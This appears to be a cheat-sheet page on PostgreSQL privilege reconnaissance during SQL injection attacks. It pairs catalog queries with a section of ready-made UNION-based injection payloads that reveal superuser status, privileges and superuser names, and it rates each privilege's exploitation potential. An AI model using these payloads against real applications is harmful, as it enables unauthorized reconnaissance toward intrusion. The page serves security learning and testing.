---
title: Privileges
description: Understanding and checking PostgreSQL privileges for SQL injection attacks
category: Advanced Techniques
order: 15
tags: ["privileges", "permissions", "superuser"]
lastUpdated: 2025-12-07
---

## Privileges

Understanding PostgreSQL privileges is crucial for determining what actions are possible during an SQL injection attack. Privilege information can reveal whether you can access files, execute commands, or perform other sensitive operations.

### Checking Superuser Status

The most important privilege check:

```sql
-- Check if current user is superuser
SELECT current_setting('is_superuser');
-- Returns 'on' or 'off'

-- Alternative method
SELECT usesuper FROM pg_user WHERE usename = current_user;
-- Returns 't' (true) or 'f' (false)

-- Using pg_roles
SELECT rolsuper FROM pg_roles WHERE rolname = current_user;
```

### User Privileges

```sql
-- Get all role attributes for current user
SELECT
    rolname,
    rolsuper,
    rolinherit,
    rolcreaterole,
    rolcreatedb,
    rolcanlogin,
    rolreplication
FROM pg_roles
WHERE rolname = current_user;
```

### Key Privilege Attributes

| Privilege     | Description                        | Exploitation Potential             |
| ------------- | ---------------------------------- | ---------------------------------- |
| `SUPERUSER`   | Full administrative access         | Read/write files, execute commands |
| `CREATEDB`    | Can create databases               | Create rogue databases             |
| `CREATEROLE`  | Can create new roles               | Create privileged accounts         |
| `REPLICATION` | Can initiate streaming replication | Data exfiltration                  |
| `BYPASSRLS`   | Bypass row level security          | Access restricted data             |

### Table-Level Privileges

```sql
-- Check privileges on specific table
SELECT grantee, privilege_type
FROM information_schema.table_privileges
WHERE table_name = 'users';

-- Check all privileges for current user
SELECT table_schema, table_name, privilege_type
FROM information_schema.table_privileges
WHERE grantee = current_user;
```

### Schema Privileges

```sql
-- Check schema privileges
SELECT nspname, nspacl
FROM pg_namespace
WHERE nspname = 'public';
```

### Function Privileges

```sql
-- Check if user can execute specific function
SELECT has_function_privilege(current_user, 'pg_read_file(text)', 'execute');
```

### File Operation Privileges

Superuser can access file system functions:

```sql
-- Check if pg_read_file is available
SELECT has_function_privilege('pg_read_file(text)', 'execute');

-- Check if COPY TO/FROM is available
-- Requires superuser or specific grants
SELECT current_setting('is_superuser');
```

### Injection Examples

```sql
-- Check if superuser
' UNION SELECT NULL,current_setting('is_superuser'),NULL--

-- Get all privileges
' UNION SELECT NULL,string_agg(privilege_type,','),NULL FROM information_schema.table_privileges WHERE grantee=current_user--

-- Check specific capability
' UNION SELECT NULL,CASE WHEN usesuper THEN 'SUPERUSER' ELSE 'NOT SUPERUSER' END,NULL FROM pg_user WHERE usename=current_user--

-- List all superusers
' UNION SELECT NULL,string_agg(usename,','),NULL FROM pg_user WHERE usesuper=true--
```

### Important System Functions

Functions requiring superuser:

| Function                  | Description                  |
| ------------------------- | ---------------------------- |
| `pg_read_file()`          | Read files from disk         |
| `pg_read_binary_file()`   | Read binary files            |
| `pg_ls_dir()`             | List directory contents      |
| `COPY ... TO/FROM`        | File I/O operations          |
| `lo_import()/lo_export()` | Large object file operations |

### Checking Extension Capabilities

```sql
-- List installed extensions
SELECT extname, extversion FROM pg_extension;

-- Check for dangerous extensions
SELECT * FROM pg_extension WHERE extname IN ('adminpack', 'file_fdw', 'dblink');
```

### Role Membership

```sql
-- Check role memberships
SELECT r.rolname as role, m.rolname as member
FROM pg_auth_members am
JOIN pg_roles r ON am.roleid = r.oid
JOIN pg_roles m ON am.member = m.oid;

-- Check if current user is member of specific role
SELECT pg_has_role(current_user, 'admin', 'member');
```

### Notes

- Superuser privileges are required for most file operations
- Even non-superusers may have dangerous permissions through role inheritance
- Always check both direct privileges and inherited roles
- Some extensions grant additional capabilities
